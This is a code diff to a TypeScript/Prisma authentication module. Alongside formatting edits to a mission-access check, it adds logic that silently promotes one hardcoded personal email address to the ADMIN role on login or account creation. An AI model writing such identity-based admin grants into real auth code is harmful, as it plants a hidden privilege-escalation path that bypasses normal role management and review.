@@ -164,12 +164,20 @@ export async function getAuthenticatedPrincipal(
       },
     });
 
+    if (dbUser && dbUser.email === "truongtumoc@gmail.com" && dbUser.role !== "ADMIN") {
+      dbUser = await prisma.user.update({
+        where: { id: dbUser.id },
+        data: { role: "ADMIN" },
+      });
+    }
+
     if (!dbUser && sessionEmail) {
+      const isAdminEmail = sessionEmail === "truongtumoc@gmail.com";
       dbUser = await prisma.user.create({
         data: {
           email: sessionEmail,
           displayName: sessionEmail.split("@")[0] ?? "Requester",
-          role: sessionRole === "SCOUT" ? "SCOUT" : "REQUESTER",
+          role: isAdminEmail ? "ADMIN" : sessionRole === "SCOUT" ? "SCOUT" : "REQUESTER",
           passwordHash: "oauth-google-authenticated",
         },
       });
@@ -285,7 +293,7 @@ export async function getMissionParticipantContext(request: Request, missionId: 
       requesterId: true,
       assignedScoutId: true,
       recipients: {
-        where: { userId }
+        where: { userId },
       },
       submission: true,
       visibility: true,
@@ -313,12 +321,22 @@ export async function getMissionParticipantContext(request: Request, missionId: 
   const isAdmin = userRole === "ADMIN";
   const isPublicParticipant = mission.visibility === "PUBLIC";
 
-  const hasEvidence = await prisma.evidence.findFirst({
-    where: { missionId, userId },
-    select: { id: true },
-  }).then((res) => Boolean(res));
+  const hasEvidence = await prisma.evidence
+    .findFirst({
+      where: { missionId, userId },
+      select: { id: true },
+    })
+    .then((res) => Boolean(res));
 
-  if (!isRequester && !isAssignedScout && !isRecipient && !isSubmitter && !hasEvidence && !isPublicParticipant && !isAdmin) {
+  if (
+    !isRequester &&
+    !isAssignedScout &&
+    !isRecipient &&
+    !isSubmitter &&
+    !hasEvidence &&
+    !isPublicParticipant &&
+    !isAdmin
+  ) {
     return {
       error: "Forbidden: You are not an authorized participant for this mission",
       status: 403 as const,
